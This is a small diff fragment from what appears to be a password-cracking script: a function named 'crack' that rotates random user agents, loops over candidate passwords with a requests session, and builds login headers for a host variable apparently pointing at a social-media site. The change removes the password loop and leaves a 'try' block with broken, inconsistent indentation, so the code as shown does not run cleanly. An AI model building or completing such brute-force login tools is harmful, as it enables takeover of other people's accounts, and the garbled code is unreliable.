@@ -468,10 +468,7 @@ def crack(idf,pwv):
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
-	 for pw in __chi__:
-                pw = pw.lower()
-                session=requests.Session()
-            try:
+      try:
                 header = {
                     "Host":cebok,
                     "upgrade-insecure-requests":"1",
